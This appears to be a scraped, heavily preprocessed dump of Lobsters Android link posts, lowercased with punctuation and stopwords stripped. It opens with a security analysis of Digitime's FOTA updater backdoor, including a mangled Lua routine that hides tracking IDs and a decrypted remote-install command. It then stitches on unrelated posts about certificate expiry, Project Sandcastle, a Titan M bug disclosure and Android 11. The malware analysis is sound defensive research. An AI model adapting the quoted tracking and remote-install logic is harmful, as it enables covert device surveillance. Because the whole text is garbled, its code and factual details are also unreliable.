upload view statistic example visible one github repo engineer erobbingluobin appears mistakenly uploaded digitime package april http includes chineselanguage documentation integrating updater system multiple version apks jellybeankitkat lollipop powerpoint presentation system systemfota april repository give u version code also code code updater fairly old still give u picture system evolved also partially obfuscated helpful analysis moreover leftover fosvcjavabak file inside apk original source code comment app partially implemented java partially lua former comfotawirelessupdateactivity package handle ui update checking download installation fota portion system quite predictable exception url hidden lua code bit later fairly standard version updater us protobufs sent endpoint checkproject check regverify upgrade upgradefinish get exciting comfotawirelessupdateactivity package includes set class interface lua runtime execute lua script four entry point lua code fosvcstartboxservice called forcv o boot network connectivity change timezone change fosvcreadfotaconfig called fotaapplicationoncreate fetch fota server url fosvcsettestcondition called forcv systemsystestaction intent received foexport binder interface lua system exposed fosvconbind fosvcstartboxservice set alarm start fosvc service every hour service start call fobootstartboot execute lua function bootentry also schedule timer perform fota check within java code two fosvc function simply redirect towards lua function bootreadfotaconfig bootsettestcondition finally although sample nt appear use foexport interface one method map callbox map call lua function bootaidl removed entirely later version unpacking lua boot module find looking fobootextractboot package stored inside extensionless zip file called armeabi contains set file containing lua bytecode lua runtime shared library later version systemfota move runtime standard apk lib subdirectory using unluac luadec get vaguely readable code file perfect part resort using luadec dis output bytecode instruction humanreadable form good enough figure going work version internally numbered also comparing aspect version shipped planet gemini pda cosmo communicator numbered firstly let look simpler function mentioned bootreadfotaconfig simply us configget fetch url single boolean flag fotaadswitch looking config script learn different url pieced together string interspersed unused junk string http appfotadigitimetechcom http http http http http gendomainname last one common practice malware generates domain based current timestamp following template bootbxxxxxxxxnet xxxxxxxx first character digest boxdomainyyyymm current year current month context config script simply provides configget configset function store variable shared preference file key string variable encrypted using encryptdata xors byte byte encodes result version present slightly different variant gemini cosmo discussed later bootversionext us different url cosmoonly fota fqdns replaced http appfotadigitimetechcom cosmoonly fota ip replaced http gemini cosmo boot fqdn replaced http geminionly boot ip replaced http dead cosmoonly boot ip replaced http next bootsettestcondition update couple configuration variable used lua code scheduling explained next section bootentry shady stuff begin initialises property within global state accessed using fetchdata storedata static method fosvc class obtained lua envget boxserviceclass start new lua handler separate thread stored using storedata boothandler call bootstart new handler bootstart query presence worker code call schedulecheck schedule checkin worker present sends boothandler handler request execute workerentry function worker separate dynamicallyupdatable package lua code meat system lie discussed later boot c c scheduling schedulecheck function mediates client check boot c c server first look value activateaccount activatecondition configuration value define activate new install activateaccount default activatecondition default value license android manifest sample value exist activateaccount activatecondition function increment activateaccount return mean code lie dormant schedulecheck called least time version neuter somewhat threshold longer multiplied default dormancy period effectively nothing following couple check network available function exit check whether enough time passed since last checkin default short interval used wifi day long interval used mobile day bypassed debugswitch configuration option version interval hour debugswitch affect go ahead checktime configuration value set current timestamp actioncheck called bootsettestcondition function mentioned earlier come set counter time variable checkin triggered immediately bypassing initial dormancy period also delay checkins boot c c checkin actioncheck quite simple function make post request booturl one attempted order succeeds containing json payload encrypted using encryptdata described earlier info sent server includes uid obtained getconfig basic information returned envinfo env script channel project id phone model rom version updater version boot version worker version present whether host app system app current network type version last two field replaced bootversionext c gemini variant identifies particular variant boot payload used pattern exists worker see later hard analyse depth without access host apk sample however difference c fota domain name one java class name host service name lua payload may unknown variant significant change field fairly selfexplanatory except channel id sometimes called customer id project id arbitrary string appear tied specific deployment within digitime infrastructure example systemfota us luobin sysluobin planet gemini us eastaeon planet cosmo us eastaeon used fota client discussed earlier lua c c client server return payload include config cmd config present value used update existing one using configset cmd present value checked determine action perform next actionregister actionupgrade actioninfo parameter pulled params key boot c c registration actionregister sends request similar fashion previous section using register action supply return envinfo also call configgetinfo get entirety data tracked config module server return payload may include new uid optional update config new uid provided stored using configset another actioncheck performed immediately without waiting next scheduled checkin boot c c info actioninfo sends request telling server information client version envinfo configgetinfo data register action sends stepped also including return phoneinfo metadata androidosbuild class phonereadtelephonyinfo identifying information imei sim phone number serial number detail current mobile network server optionally return update config two new cmd get client execute either actionregister actionupgrade immediately boot c c upgrade last command look actionupgrade params specify url worker package downloads package extract worker directory specified config module give system power although boot system fairly benign giving digitime nothing basic metric deviceidentifying data upgrade command allows supply worker package containing arbitrary lua code boot aidl slight detour look worker included mechanism allowed java code bind fosvc service retrieve interface call bootaidl function handle getuid command return configget uid command passed workeraidl function within worker lua worker worker core digitime c c client client registered device using boot module discussed send upgrade command worker download particularly insidious system digitime maintains different worker different ability mean documenting everything difficult know three variant may nt know simply guess url c c wo nt supply sample observed located shadysounding domain appear use distribute updated worker malwareadware application pushed device record various malware tracking site suggesting digitime used store longer active digitime domain name later section report every worker us external interface process different command architecture similar boot module currently know three version counting variant available following url http http http first report version two report version also workerversionext field match last character name like bootversionext field seen seems identify separate variant particular worker version different capability b worker fairly basic provides ability base boot module digitime server offered cosmo worker add interesting malwarelike behaviour discus later section initialisation worker controlled single entry point workerentry called boot module discussed earlier begin one particularly interesting piece code set various class name allowing adapt different version host android application two externally supplied variable host configures creating lua state queried boxpackagename serviceverint package name supplied default iwabox setting first row following table used otherwise check serviceverint determine kind host dealing service version boot handler service utility receiver nil package boxboot boxhandler guardservice boxutility boxreceiver nil version foboot fohandler fosvc foutility forcv foboot fohandler baseintentservice inforeceiver foboot fohandler gcmbaseintentservice gcmbroadcastreceiver foboot fohandler foboot fohandler undefined undefined similar bootentry boot module worker creates new lua thread handler store workerhandler data field service class workerstart function executed new thread workerstart quite straightforward call schedulecheck false note despite naming separate schedulecheck function present boot module none boot code accessible separate context increment callcount configuration variable schedulecheck returned true worker call misccheckretention variant immediately terminates thread also code executing debug action nt believe activated using version host seen default c c url used worker module follows three variant looked http http worker c c device id uuid module worker expose simple api uuidreaddid uuidwritedid uuidreaduuid responsible keeping track two different user id really sneaky value kept multiple different place order make harder someone remove tracking data also try detect tampering report home uuid stored globally cachelogprouuid locally packagefileslogprouuid packagesharedprefsuuidproxml uuidreaduuid function check order xml private data cache take first valid one correct none present new one generated using java uuid class missingnonmatching entry replaced function return uuid along information read string eg specifies read nothing nonmatching uuid matching uuid write string eg specifies whether writes made yes loc string specifies location uuid pulled wlog uuidreaduuid result xmluuid xmlvalid readuuidatxmlsp privuuid privvalid readuuidatprivatedata cacheuuid cachevalid readuuidatcache wlog uuidxml tostring xmluuid tostring xmlvalid wlog uuidprivate tostring privuuid tostring privvalid wlog uuidcache tostring cacheuuid tostring cachevalid xmlreadflag xmlvalid privreadflag privvalid cachereadflag cachevalid loc xmluuid whatuuid xmluuid loc x else privuuid whatuuid privuuid loc p else cacheuuid whatuuid cacheuuid loc c wlog uuid tostring whatuuid whatuuid whatuuid builduuid loc n wlog uuidloc tostring loc result loc loc whatuuid result read x tostring xmlflag p tostring privflag c tostring cacheflag return whatuuid tostring whatuuid xmlwriteflag privwriteflag cachewriteflag xmluuid whatuuid xmlreadflag else xmlwriteflag writeuuidatxmlspdata whatuuid privuuid whatuuid privreadflag else privwriteflag writeuuidatprivatedata whatuuid cacheuuid whatuuid cachereadflag else cachewriteflag writeuuidatcache whatuuid readinfo x tostring xmlreadflag p tostring privreadflag c tostring cachereadflag writeinfo x tostring xmlwriteflag p tostring privwriteflag c tostring cachewriteflag wlog uuidreadstatus tostring readinfo wlog uuidwritestatus tostring writeinfo result read readinfo result write writeinfo slightly different supplied digitime server register rather generated client expose separate uuidreaddid uuidwritedid function stored globally cachelogprodidzzzz zzzz result calling encryptdata package name output munged make safe filename replacing b c locally packagefileslogprodid packagesharedprefsdidproxml aside difference behaves almost identically uuid reader returning read write loc field also check presence phoneid field using getconfig log message call old perhaps used older version worker version worker actually add location id version looked also store uuid hidden file sd cardexternal storage ca nt pas tracking opportunity worker c c scheduling worker scheduler nt include dormant period boot scheduler get going straight away otherwise work similar fashion default configuration requires minimum hour checkins regardless connection type theoretically changeable perclient basis c c server config update mechanism nt know actually condition met actioncheck called worker extend functionality later worker c c checkin client sends check request worker url enclosing envinfo data includes phone model serial number channelproject id uid boot module whether host package app installdelete permission package name signature whether host package system app bit internal metadata worker also add imei imsi envinfo data tag extra payload main request data returned getinstallreport later result checked command typical fashion worker support register upgrade test worker also support info install uninstall retention server also optionally supply update config seen handler optionally params object contains value cid pid activatetime register upgrade command basically seen test command nothing b worker little check supply envinfo data every often upgrade otherwise nothing interest let look fancier worker worker c c info gathering info command present worker thing really start seem like malware asks client send back request bunch information base request includes return envinfo however server supply infolevel integer individual bit specify kind information return bit configgetinfo called returning worker entire configuration bit phoneinfo called returning metadata phone androidosbuild class bit phonereadtelephonyinfo called returning identifying info user mobile network sim card bit packagereadlist false called returning name flag installed nonsystem package bit packagereadlist true called returning name flag installed package worker c c package control next install uninstall command present worker giving digitime ability remotely install apps report sent check come handy server install command accompanied detail apk download install along metadata information install process get stored install report using updateinstallreport function new lua thread started workerinstall function additionally server pass true keepcheck field worker call store information id type package service action mode either install report update accompanied call actionreport call c c server tell current status workerinstall function separate thread simply read parameter passed last install action downloads apk fetched installs package call schedulenext activate turn call workeractivate new thread second workeractivate check make sure package installed attempt activate using specified intent optionally include channel id project id device id activatetime configuration field passing newly installed app else uninstall command fairly predictable allowing digitime server remove specified app mentioned retention command earlier server supply list apps worker act upon depending mode value specified app remove list add list regular checking uninstall entirely call misccheckappretention function check see whether app installed running optionally forcibly reactivate worker c c backdoor difference worker come worker installs package shelling pm command worker ups ante using wide variety method install remove package check version code lua host determine method offer call one variety method prefers shelling pm prefers isinstallpackage isdeletepackage prefers isipackage isdpackage prefers isipa isdpa prefers isgri isgrd make difficult fully document nt managed find example host apps provide version sure behind scene systemfota app preloaded cosmo communicator however provides isgri isgrd method among others hook favourite part whole disaster foslenhance cosmo systemfota app includes set obscurely named interface called iorgx iorgy iorgz defined within package yes really say internel accessed comdtinfotoolsactivityl class bit comdtinfotoolscall package method bound lua method box class fostate including isgri isgrd method mentioned call custom android system service present cosmo yet located device rom include code fota updater interacts except update check ui call lb fetch backdoor version number iorgz interface orgzver method fails check call fails making heavy assumption suspect digitime asks oems include service firmware requirement fota updater simply ensures nt remove part fota update system actually us service far tell way would used digitime load worker onto device us remotely install apps service question accessed calling servicemanagergetservice foslenhance return instance androidappilightsservice ipc service defined bootframework nt exist stock android implementation question defined class defined service framework looking give u welldefined public interface service connection android service fully ipc enabled via binder addservice register service given name ibinder integer version number getservice return service ibinder getserviceversion return service version listservice return list registered service name removeservice remove service name interesting thing handler android secret code typing phone app trigger receiver show notification also unused access control method c string validates passed string calling package one installrunharryliudigicomligthservicetest comfotawirelessupdate comsystemftools also getversion method return version examined subservices static method called initialisation turn call orgximpregservice orgyimpregservice orgzimpregservcie yes misspelled register three used service also add fpservice instance empty name mean never actually get added fpservice defined bootframework implement iorgb interface two method one read file one writes file however even used backdoor iorgx service offer method play around package orgxgrd uninstalls package orgxgri installs package orgxgrr call android recovery system install ota package orgxgsas call packagemanagersetapplicationenabledsetting set app enabled status system privilege orgxgscs call packagemanagersetcomponentenabledsetting set component enabled status system privilege backdoor iorgy service offer one hilariously powerful method orgygm allows android permission silently granted app regardless whether defines permission manifest delving state packagemanagerservice using copious amount java reflection backdoor iorgz one bucket unrelated fun thing lot helpful debug message usual digitime fashion orgzg return device last known location orgztan get package name current topforeground activity orgzab addcheckappaction add action getactions arraylist orgzrb remove action getactions arraylist orgzr reboots device orgzcfd copy callerprovided file handle callerprovided path system privilege orgzrfd copy callerprovided path callerprovided file handle system privilege orgzdfd deletes file callerprovided path orgzver return version string using constant defined orgzinbase obtains bunch information device metadata serial number imeis sim detail network detail regionlanguage etc pack json crudely xorencrypts result orgzdaemonaddse add component q map orgzreser remove component q map orgzclser clear protect service remove every component q map orgzlife iterate every service listed q map running send arbitrary broadcast orgzrout remove serviceforegroundtimeoutmsg sure one security implication okay first consider done system privilege app access service authentication place every method extra parameter must set constant string uisteopck depending subservice presence unused c string method mentioned earlier implies digitime one point toying requiring calling app particular id well passing appropriate string nt even bother end ability grant app arbitrary permission readwrite file system user mean app running system digitime foslenhance service ridiculous amount power able use dump android account database including auth token even disable systemfota system app unprivileged app declared permission could nt use read app data android sandbox specific linux user may way someone android security knowledge could pull really like see device contain backdoor could nt track rom planet gemini mentioned earlier also us digitime fota updater significantly older version require include backdoor malware linked digitime research came across bunch example known adwaremalware distributed cdn digitime us distribute worker various apks almost identical randomly generated name package name certificate comsenelevenholesuit comhinedeyempoy furthermore contain reporting mechanism talk server belonging digitime speak almostidentical protocol semireadable nonsense encryption key example comsenelevenholesuit render ad loaded sxomuchaincom domain registered person using whois info shopping mall tokyo qiming iot website phone home http hooconsant class example includes traditional channel id project id used digitime system encryption key hoopacket class also used legitimate side fota updater comspitsbergentemperatures available koodous another app nothing render ad actually includes code fetch cid pid activatetime value worker pas app intent obvious intended installed digitime worker system thread xda developer includes packet dump someone actively affected digitime worker installing malware phone running fota app dump encrypted trivial decrypt know key appear running backdoorfree worker decrypted install command server sent errcode cmd install params id replacemethod service comemblazonfelicitutiljuesvc package comemblazonfelicit keepcheck true cmd install url http action type intentservice intentaction comemblazonfelicitutiljuesvc extra true packagever type config intervalshort intervallong variety fun example find search online url able track mention andor copy file located digitime cdn comslnormal comspitsbergentemperatures comreibiahsbghsrunst comioqicscigaxpljb comuctsadtxaschquyry commonecaswedwakesmen comhinedeyempoy comsenelevenholesuit comgratedpower compeonymochi next contacted planet computer december digitime software included cosmo replied next day saying passed onto developer ca nt comment understandably hoping remove nevertheless planet one oem though undoubtedly others using digitime service way trust ota distributor moonlight malware distributor like nt typical accidental security bug company knowingly actively putting malware distribution mechanism phone supply chain getting paid truly living dream nt even first time ota update provider caught redhanded abusing trust security firm kryptowire discovered similar situation involving adups whose fota software exfiltrated personal data allowed arbitrary apps installed hey nt seem familiar perhaps publicly shaming digitime make something change one guy laptop big research firm better nothing right device digitime backdoor present interested knowing take look firmware let know twitter ninji email ninji wuffsorg update ready write full followup yet wanted amend note contact planet computer past day regarding situation pc entirely unaware security issue ota software working mitigation switching away digitime happy response handling professional receptive started investigating issue internally day notified digitime appear realised game spotted noticed interesting change yesterday poked api first time using cosmo id served brand new worker version entirely rip functionality bar external function leaf essentially empty shell file dated curiously day pc made internal inquiry following disclosure also tried pretending gretel packet dump xda developer thread linked earlier got brand new worker identified workerversionext yeah identical standard b worker respect except version id compile date server handling boot request simply returning many connection error today change occurred boot server working url simply return pretending cosmo gemini get request upgrade worker http old b worker different url pretending gretel using exact request sent yesterday get http sound like would variant cosmo empty worker url also digitimetech qimingiot website taken today record removed replaced cnames random residential ip address shoutout securitytrails helping confirm http securitytrailscomdomainwwwdigitimetechcomhistorya management portal portaldigitimetechcom device manufacturer still running bit digitime web presence still seems running previous post shade grey building emulator
50,Lobsters,android,Android,HTTPS Obsolescence,https://www.camg.me/https-obsolescence/,http obsolescence,nope right repair device life cycle,tablet ten year old used read lot great book although usually install application went day despite connected internet met message wondering issue connection tried open duckduckgocom chrome ah certificate issue must unable connect google play store see update install new certificate nope shame perfectly good piece hardware partially unusable hardware perspective tablet work great suit need however manufacturer product align reality right repair movement think applies ability root update tablet would restore nearly original value functionality root available tablet old trying create one would probably consume much time would economically efficient new one course go benefit manufacturer device life cycle would great see incentive around life cycle device know everything phone refrigerator built last consumer would love pay little device like continue repairable updateable visiting httponly website
51,Lobsters,android,Android,Project Sandcastle: Android for the iPhone,https://projectsandcastle.org/,project sandcastle android iphone,,sandbox set limit boundary sandcastles provide opportunity create something new limitless bound imagination project sandcastle building something new silicon hardwarethe iphone restricts user operate inside sandbox buy iphone iphone hardware android iphone give freedom run different operating system hardwareandroid iphone many exciting practical application forensics research dualbooting ephemeral device combatting ewaste goal always push mobile research forward excited see developer community build foundation
52,Lobsters,android,Android,adb-enhanced: A Swiss-army knife for Android development and testing,https://github.com/ashishb/adb-enhanced,adbenhanced swissarmy knife android development testing,join github today sign,dismiss join github today github home million developer working together host review code manage project build software together sign
53,Lobsters,android,Android,A mysterious bug in the firmware of Google's Titan M chip (CVE-2019-9465),https://alexbakker.me/post/mysterious-google-titan-m-bug-cve-2019-9465.html,mysterious bug firmware google titan chip,hn reddit android keystore discovering bug hsm strongbox titan chip discovering bug aegis authenticator keystorehandlejava digging deeper android security reward program available github supported cipher mode promised timeline timeline call google conclusion ct test,starting release pixel google pixel android smartphones come titan security chip board realized pixel xl purchased also decided try take advantage app work turned using titan chip android keystore api aesgcm specific way lead predictable bogus ciphertext story stumbled upon bug bit mysterious discussed hn reddit android keystore let start short highlevel primer android keystore strongbox jump already familiar two concept skip ahead discovering bug android keystore system service allows apps securely generate use cryptographic key apps use key generated extract never enter process app idea behind even process app compromised key practical security system varies across device android keystore various kind backing device simply keep whole system android device come tee even come entirely separate chip back android keystore latter offer best security even attacker able compromise operating system would still need vulnerability hsm get key android keystore fact chip shipping smartphones day pretty exciting development ask strongbox titan chip android keystore implementation fall latter category referred strongbox keymaster titan chip one take advantage android app pixel device one indicate preference strongbox key generation simply calling setisstrongboxbacked true keygenerator instance apps use android keystore get secure storage cryptographic key apparent downside thought anyway discovering bug work app android aegis authenticator app store otp secret encrypted file referred vault master key used encryptdecrypt vault managed key slot system similar luks learn short aegis concept two type key slot password biometric authentication biometric key slot encrypts master key key stored android keystore master key later decrypted successful biometric authentication user key generation code look like aegis excerpt keystorehandlejava keygenerator generator keygeneratorgetinstance keypropertieskeyalgorithmaes storename generatorinit new keygenparameterspecbuilder id keypropertiespurposeencrypt keypropertiespurposedecrypt setblockmodes keypropertiesblockmodegcm setencryptionpaddings keypropertiesencryptionpaddingnone setuserauthenticationrequired true setrandomizedencryptionrequired true setkeysize cryptoutilscryptoaeadkeysize build generates key used aes gcm mode encryption decryption user authentication required key used biometric authentication user work fine let switch strongbox diff git aappsrcmainjavacombeemdevelopmentaegiscryptokeystorehandlejava bappsrcmainjavacombeemdevelopmentaegiscryptokeystorehandlejava index aappsrcmainjavacombeemdevelopmentaegiscryptokeystorehandlejava bappsrcmainjavacombeemdevelopmentaegiscryptokeystorehandlejava public class keystorehandle setencryptionpaddings keypropertiesencryptionpaddingnone setuserauthenticationrequired true setrandomizedencryptionrequired true setisstrongboxbacked true setkeysize cryptoutilscryptoaeadkeysize build test change went aegis setup process set password enabled biometric unlock main view opened could start adding token far good however closed app reopened tried unlock vault biometric authentication app showed error dialog caused following chain exception combeemdevelopmentaegisdbslotsslotintegrityexception javaxcryptoaeadbadtagexception combeemdevelopmentaegisdbslotsslotgetkey caused javaxcryptoaeadbadtagexception androidsecuritykeystoreandroidkeystorecipherspibaseenginedofinal javaxcryptocipherdofinal caused androidsecuritykeystoreexception signaturemac verification failed androidsecuritykeystoregetkeystoreexception androidsecuritykeystorekeystorecryptooperationchunkedstreamerdofinal androidsecuritykeystoreandroidkeystoreauthenticatedaescipherspi bufferalloutputuntildofinalstreamerdofinal androidsecuritykeystoreandroidkeystorecipherspibaseenginedofinal javaxcryptocipherdofinal huh decryption key slot fails apparently verification mac failed could added single line enable strongbox left rest code alone would attached debugger point see going useful see going hsm cryptographic operation take place couple try turned kind exception getting consistent waited couple second authenticating biometric prompt shown got entirely different exception javasecurityinvalidkeyexception keystore operation failed combeemdevelopmentaegiscryptokeystorehandleiskeypermanentlyinvalidated combeemdevelopmentaegiscryptokeystorehandlegetkey combeemdevelopmentaegisuiauthactivityoncreate caused javasecurityinvalidkeyexception keystore operation failed androidsecuritykeystoregetinvalidkeyexception androidsecuritykeystoregetinvalidkeyexception androidsecuritykeystorekeystorecryptooperationutilsgetinvalidkeyexceptionforinit androidsecuritykeystorekeystorecryptooperationutilsgetexceptionforcipherinit androidsecuritykeystoreandroidkeystorecipherspibaseensurekeystoreoperationinitialized androidsecuritykeystoreandroidkeystorecipherspibaseengineinit javaxcryptociphertrytransformwithprovider javaxcryptociphertrycombinations javaxcryptocipher spiandproviderupdaterupdateandgetspiandprovider javaxcryptocipherchooseprovider javaxcryptocipherinit javaxcryptocipherinit combeemdevelopmentaegiscryptokeystorehandleiskeypermanentlyinvalidated caused androidsecuritykeystoreexception invalid key blob androidsecuritykeystoregetkeystoreexception digging deeper point decided issue may worth reporting google android security reward program attempt get better grasp issue actually wrote small configurable poc app demonstrates issue go along report open source available github gone iteration since initial report google screenshots show latest version app sits loop repeatedly encryptsdecrypts hard coded plaintext print result log shown screenshots user authentication timeout try thing configurable option dialog see going inside hsm give u good look behavior see outside looking log turn bug cause cryptographic operation produce predictable bogus ciphertext plaintext ciphertext tag nonce decrypted plaintext ciphertext tag nonce note ciphertext second iteration look random one would expect fact even sequence repeat let try plaintext ciphertext tag nonce decrypted plaintext ciphertext tag nonce matter many time repeated resulting ciphertext always nonce always different even obvious decryption failed aegis trying decrypt bogus ciphertext like certainly result mac verification failure bogus plaintext dangerous thing fact fails spectacularly without throwing exception also completely defeat one important guarantee symmetric cipher provide ciphertext indistinguishable random noise playing around app concluded waiting long around second cipher initialization using encryptdecrypt something elicits behavior appears issue aes gcm mode also tested supported cipher mode seem behave correctly unfortunately research grinded halt go would need access firmware running titan chip see might going wrong google promised open source firmware delivered promise day best guess would memory corruption issue far going get without access google seem willing discus detail issue either notice reading timeline also took quick look android source tree see could find place aesgcm used combination strongbox randomness ciphertext relied upon latter case csprng implementation example though think reason someone would use gcm mode purpose attack vector could come perhaps someone knowledgeable android internals think something else timeline total took month get fixed timeline report submitted google responds looking google responds fix infeasible team tell error implementation cause exhibited behavior actually bug android keygenparameterspec setuserauthenticationrequired true set keygenparameterspec set authenticate setuserauthenticationvaliditydurationseconds int encryption never authorized addition instantiating keygenparameterspec keypropertiespurposedecrypt added decryption failed neither suggestion make sense fair always found android keystore key generation api bit confusing interesting see member android security team struggling well respond suggesting take another look actually try run poc app instead trying find flaw use api ask status update google responds update time google responds high severity ask status update google responds still looking ask status update google responds apologizing delay saying issue taking longer remediate usual day window asks intend disclose whether willing participate coordinated disclosure respond saying intend disclose yet patchsolution go along disclosure google responds thanking clarification assuring keep updated ask status update google responds issue fixed tracking fix release december provide detail soon regarding cve reward eligibility also severity adjusted high critical respond expressing glad fixed ask status update google responds like acknowledge contribution publicly cve assigned respond thanks status update ask fix still track release december whether report eligible reward tell plan writing blog post google responds thanks sharing disclosure plan reassures fix still track release december report eligible reward respond thanks clarification assuring let review blog post first publish google responds cve number given previously incorrect correct one google responds reward committee decided reward reporting security issue respond thanking reward also ask detail bug little go blog post plan write google responds confirming suspicion bug titan firmware provide additional information respond reporting finding installing december security update bug still present device google responds saying unable reproduce issue lot back forth try get log device turned android able update firmware titan chip device possibly due bad state gotten developing poc initcitadel citadel version gdk chunkycamcorpgooglecom initcitadel citadel running known older firmware sending update initcitadel citadel allowing ro update initcitadel citadel update loaded initcitadel could enable citadel update password required initcitadel citadel rebooted chatty hsm vendorbinhwcitadeld identical line e vendorbinhwandroidhardwareauthsecret incorrect citadel update password vendorbinhwandroidhardwareoemlock running oemlock setoemunlockallowedbycarrier chatty hsm vendorbinhwcitadeld identical line ask status update google responds recommending factory reset device resolve state continue investigate issue respond saying factory reset device security issue longer present catch update process firmware version seem newer initcitadel checking citadel version initcitadel citadel version gdk chunkycamcorpgooglecom initcitadel citadel nt running known older firmware updating call google sharing draft blog post team asked would willing join short call wanted provide detailscontext fix process issue prior publication blog post agreed call apologized long turnaround time poor communication appreciate indeed main disappointment submitting first android security issue report keep asking status update felt like kept loop one would expect team share new information becomes available initial draft blog post fairly snarky comment fact severity rating changed fix high critical explained guideline severity rating changed process handling report adjusted severity rating based new guideline fair enough removed comment overall impression got genuinely care handling android security report well regret go well would liked time around naturally also used opportunity ask could provide information nature actual bug status open sourcing titan firmware comment conclusion ended performing factory reset device day ago seems magically fixed titan firmware update issue security issue also appears resolved would loved try dig deeper said source titan firmware simply available google appears added ct test exhibited behavior trace bug fixed also learned important lesson upon initial disclosure google firmly set standard deadline clear party expectation secondly despite setting deadline upfront disclosed publicly much earlier ended feel right disclose security issue fix workaround offer since come realization getting information important
54,Lobsters,android,Android,Turning it up to 11: the first Developer Preview of Android 11,https://android-developers.googleblog.com/2020/02/Android-11-developer-preview.html,turning first developer preview android,visit android developer site download system image developer manual download flash timeline test give feedback helpful innovation experience existing connectivity apis dynamic meteredness api unmetered bandwidth estimator api downstreamupstream bandwidth new screen type holepunch waterfall screen display cutout apis new api inset people conversation dedicated conversation section bubble bubble api insert image notification reply people bubble apis neural network api quality service apis memory domain apis expanded quantization support signed integer asymmetric quantization ndk sample code privacy security privacy onetime permission scoped storage read read security biometrics authenticator type androidx platform hardening heap pointer tagging hwasan hwasanenabled system image secure storage sharing data blobstoremanager identity credential update compatibility google play system update project mainline blog post app compatibility minimizing impact behavior change easier testing debugging check detail updated greylists restricted nonsdk interface request public api equivalent dynamic resource loader resource loader framework new platform stability milestone polish quality connectivity call screening service improvement verification status post call screen wifi suggestion api enhancement wifi suggestion api passpoint enhancement wifi suggestion api image camera improvement heif animated drawables imagedecoder api compared animated gifs decodedrawable animatedimagedrawable native image decoder ndk apis ndk sample code muting camera capture bokeh mode low latency lowlatency video decoding mediacodec stadium check configure hdmi lowlatency mode get started android feedback device system image pixel xl pixel xl pixel xl pixel xl gsi image setup guide canary channel try new feature apis api overview api reference diff report feedback request test current app compatibility test app optin change toggle change individually let u know visit android developer site preview update developer manual download flash downloads instruction android beta currently available android give u feedback let u know think report,posted dave burke vp engineering android led way towards future mobile new technology like foldable display machine learning built core hallmark approach strong developer community provides early thoughtful feedback helping u deliver robust platform apps game delight billion user around world today releasing first developer preview android building strong feedback cycle last year making year preview available earlier ever android keeping focus helping user take advantage latest innovation continuing keep privacy security top priority added multiple new feature help user manage access sensitive data file hardened critical area platform keep o resilient secure developer android ton new capability apps like enhancement foldables callscreening apis new medium camera capability machine learning first look like prior year continue share new feature update coming month google io work feedback important thing right visit android developer site download system image pixel device let u know think today release early baseline build developer intended daily consumer use making available manual download flash remember getting early input crucial helping u evolve platform meet need read taste new android visit developer site detail timeline test give feedback helpful innovation experience brings consistently faster speed lower latency user around world extend wifi app experience streaming video loading higherres game asset mobile user build new experience designed specifically android enhancing updating existing connectivity apis take advantage improved speed dynamic meteredness api api check whether connection unmetered offer higher resolution quality may use data extended api include cellular network identify user whose carrier offering truly unmetered data connected carrier network bandwidth estimator api updated api make easier check downstreamupstream bandwidth without needing poll network compute estimate modem provide support make default estimation based current connection moving beyond home example let enhance onthego experience providing seamless interaction world around friend family business new screen type device maker continuing innovate bringing exciting new formfactors device screen market extended support platform apis let optimize apps holepunch waterfall screen apps manage holepunch screen waterfall screen using existing display cutout apis want new api let app use entire waterfall screen including edge inset help manage interaction near edge people conversation communicating friend colleague important thing many people phone android introducing change help developer create deeper conversational experience see early version dedicated conversation section notification shade user instantly find ongoing conversation people favorite apps bubble bubble way keep conversation view accessible multitasking phone messaging chat apps use bubble api notification enable android insert image notification reply app support image copypaste let user insert asset directly notification inline reply enable richer communication well app part see image copy support chrome image paste support via gboard clipboard realtime bilateral communication apps use sharingconversation shortcut api provide people target android surface throughout phone well bubble apis allow user carry conversation using device capacity neural network api neural network api nnapi designed running computationally intensive operation machine learning android device android expanding operation control available developer release added new operation execution control help optimize common use case quality service apis support priority timeout model execution memory domain apis reduce memory copying transformation consecutive model execution expanded quantization support added signed integer asymmetric quantization signed integer used place float number enable smaller model faster inference see ndk sample code example using new apis watch coming later preview update working hardware vendor popular machine learning framework tensorflow optimize roll support nnapi privacy security privacy privacy always core android year added way keep user secure increase transparency control change popular user example android added app use permission option give user granular control location limit background location access far given app use option half user select android continuing focus user privacy new permission option update scoped storage please give feature try apps right away let u know think onetime permission sensitive type data location also device microphone camera user grant temporary access onetime permission permission mean apps access data user move away app must request permission next access information onetime permission dialog android scoped storage continued work better protect app user data external storage made improvement help developer migrate easily want take moment acknowledge everyone android community gave u helpful feedback thank much helping u make platform better preview release includes several enhancement optin raw file path access medium updated documentsui batch edit operation mediastore along technical change based input also giving time make migration change apply apps target android read watch enhancement subsequent update addition platform change user tell u want protection earlier version android transparency around apps use data updating google play policy ensure apps request location permission truly necessary read security focus raising bar security version android reaching device monthly security update building protection latest platform android extended android defenseindepth strategy area platform added new feature apis apps biometrics expanded biometrics support meet need wider range device biometricprompt support three authenticator type different level granularity strong weak device credential also decoupled biometricprompt flow app activity lifecycle make easier integrate various app architecture improve transaction ui apps using biometric auth move biometricprompt apis also available androidx compatibility earlier version android platform hardening expanded use compilerbased sanitizers securitycritical component including boundsan intsan cfi shadowcall stack also enabling heap pointer tagging apps targeting android higher help apps catch memory issue production hardening improvement may surface repeatablereproducible app crash code please test apps used hwasan find fix many memory error system offer hwasanenabled system image help find issue apps secure storage sharing data apps share data blob easily safely apps blobstoremanager blob store ideal usecases like sharing ml model among multiple apps user identity credential android add platform support secure storage retrieval verifiable identification document iso compliant mobile driving license detail share soon update compatibility google play system update since android scaling investment google play system update project mainline improve security privacy consistency across ecosystem thanks strong collaboration device maker made significant progress towards goal expanded infrastructure reach wider range device safely quickly android added new updatable module total module highlight include permission module standardizes user developer access critical privacy control android device medium provider module integral privacy effort around scoped storage nnapi neural network api module optimizes performance guarantee consistent apis across device learn google play system update check project mainline blog post app compatibility also working make update faster smoother prioritizing app compatibility roll new platform version android added new process developer tool release milestone minimize impact platform update minimizing impact behavior change change make android make o helpful secure better performing change affect developer apps built android made conscious effort minimize behavioral change could affect apps closely reviewing impact making optin wherever possible set targetsdkversion r app hope give developer control lead apps working outofthebox android easier testing debugging help test compatibility made many breaking change toggleable meaning forceenable disable change individually developer option adb change longer need change targetsdkversion recompile app basic testing check detail app compatibility toggle developer option updated greylists updated list restricted nonsdk interface always feedback request public api equivalent welcome dynamic resource loader part migration away nonsdk interface developer asked u public api load resource asset dynamically runtime added resource loader framework android thank developer gave u input new platform stability milestone developer also told u preparing early app compatibility challenge without clear date final change android adding new release milestone called platform stability expect reach early june milestone includes final sdkndk apis also final internal apis system behavior may affect apps hope use new milestone plan final development testing release timeline polish quality connectivity call screening 